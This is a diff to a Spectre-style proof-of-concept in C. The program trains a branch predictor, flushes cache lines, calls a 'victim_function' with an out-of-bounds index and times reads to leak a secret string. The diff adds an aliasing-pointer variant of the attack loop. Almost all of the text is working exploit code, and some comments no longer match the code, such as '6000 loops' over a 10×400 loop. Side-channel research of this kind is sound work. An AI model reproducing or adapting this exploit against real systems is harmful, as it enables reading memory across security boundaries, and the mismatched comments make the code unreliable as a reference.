@@ -64,7 +64,10 @@ uint32_t array1[16] = {
   16
 };
 uint8_t unused2[64];
-uint8_t array2[256 * 512] = {0};
+uint8_t array2[256 * 512];
+int32_t big_block[4096];
+volatile int32_t* alias;
+volatile int32_t dropbag;
 
 char * secret_string       = "The Magic Words are Squeamish Ossifrage.";
 const uint32_t secret[]     =
@@ -138,12 +141,8 @@ static inline unsigned long array_index_mask_nospec(unsigned long index,
 }
 #endif
 
-void victim_function(size_t x) {
-  volatile int dropbag;
-  volatile int fakebag = 0;
-  volatile int jawbag = 'D';
-  volatile int* p = &fakebag;
-  dropbag = 0;
+void victim_function(size_t x, register volatile int32_t* dropbag, register volatile int32_t* alias) {
+  //*dropbag = 0;
   if (x < array1_size) {
 #ifdef INTEL_MITIGATION
 		/*
@@ -158,9 +157,10 @@ void victim_function(size_t x) {
 #ifdef LINUX_KERNEL_MITIGATION
     x &= array_index_mask_nospec(x, array1_size);
 #endif
-    dropbag = array1[x]+1;
-  } else { dropbag = 0; }
-  temp &= array2[(*(p-1)-1) * 512];
+    *dropbag = array1[x]+1;
+    temp &= array2[(*(alias)-1) * 512];
+  } else { *dropbag = 0; }
+  //temp &= array2[(*(alias)-1) * 512];
 }
 
 
@@ -218,33 +218,31 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
         flush_memory_sse( & array2[i * 512]);
 #endif
 
-    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
+    /* 6000 loops: 999 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
-    for (j = 29; j >= 0; j--) {
-#ifndef NOCLFLUSH
-      _mm_clflush( & array1_size);
-#else
-      /* Alternative to using clflush to flush the CPU cache */
-      /* Read addresses at 4096-byte intervals out of a large array.
-         Do this around 2000 times, or more depending on CPU cache size. */
+    uint64_t training_alias = (uint64_t)&dropbag;
+    uint64_t malicious_alias = (uint64_t)alias;
+    int32_t* alias_p;
+    for (int k = 0; k < 10; k++) {
+      for (j = 400-1; j >= 0; j--) {
+        /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
+        /* Avoid jumps in case those tip off the branch predictor */
+        x = (j - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+        x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
+        alias_p = training_alias ^ (x & (malicious_alias ^ training_alias));
+        x = training_x ^ (x & (malicious_x ^ training_x));
 
-      for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
-        junk2 = cache_flush_array[l];
-      } 
-#endif
+        _mm_clflush( & array1_size);
+        _mm_clflush( (void*)& dropbag);
+        //_mm_clflush( (void*)(alias));
 
-      /* Delay (can also mfence) */
-      for (volatile int z = 0; z < 100; z++) {}
+        /* Delay (can also mfence) */
+        for (volatile int z = 0; z < 100; z++) {}
 
-      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-      /* Avoid jumps in case those tip off the branch predictor */
-      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
-      x = training_x ^ (x & (malicious_x ^ training_x));
+        /* Call the victim! */
+        victim_function(x, &dropbag, alias_p);
 
-      /* Call the victim! */
-      victim_function(x);
-
+      }
     }
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
@@ -352,7 +350,13 @@ int main(int argc,
     cache_flush_array[i] = 1;
   }
   #endif
-  
+
+  uint64_t alias_base = ((uint64_t)big_block) & (uint64_t)(~0x2fff);
+  alias_base = 0;
+  alias = (int32_t*)((((uint64_t)&dropbag) & 0x2fff) + alias_base);
+  //alias = &dropbag;
+  printf("dropbag: %p\n  alias: %p\n", &dropbag, alias);
+
   for (i = 0; i < (int)sizeof(array2); i++) {
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
   }
